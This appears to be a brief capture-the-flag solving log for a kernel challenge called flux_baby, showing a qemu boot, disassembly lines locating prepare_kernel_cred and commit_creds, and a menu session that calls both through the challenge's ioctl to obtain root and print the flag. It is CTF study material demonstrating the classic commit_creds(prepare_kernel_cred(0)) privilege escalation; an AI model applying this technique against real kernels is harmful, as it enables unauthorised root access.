Finding address to call commit_creds(prepare_kernel_cred(0)); and make it become root

Reference:

https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html


Solving logs:

```
qemu-system-x86_64 -monitor /dev/null -m 64 -nographic -kernel "bzImage" -initrd initrd.cpio -append "console=ttyS0 init='/init'"


ffffffff8104602b: e8 20 8e 00 00        callq  ffffffff8104ee50 <prepare_kernel_cred>
0xffffffff8104ee50 <prepare_kernel_cred>:
18446744071579168336


ffffffff8103c0fe: e8 cd 28 01 00        callq  ffffffff8104e9d0 <commit_creds>


18446744071579167184

ffff88000212c000

----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 1
1
I need a kernel address to call. Be careful, though or we will crash horribly...
> 
18446744071579168336
18446744071579168336
There is a good chance we will want to pass an argument. Which one is it?
> 
0
0
random: fast init done
Got call address: 0xffffffff8104ee50, argument: 0x0000000000000000
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104ee50 as function ptr, calling it
A miracle happened. We came back without crashing! I even got a return value for you.
It is: ffff88000212cb40
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 1
1
I need a kernel address to call. Be careful, though or we will crash horribly...
> 
18446744071579167184
18446744071579167184
There is a good chance we will want to pass an argument. Which one is it?
> 
18446612132349004608
18446612132349004608
Got call address: 0xffffffff8104e9d0, argument: 0xffff88000212cb40
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104e9d0 as function ptr, calling it
A miracle happened. We came back without crashing! I even got a return value for you.
It is: 0000000000000000
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 2
2
uid=0(root) gid=0(root)
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 3
3
Which file are we trying to read?
> ./flag
./flag
Here are your 0x40 bytes contents: 
flag{well_done_this_is_how_every_kernel_exploit_eventually_goes}
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
```
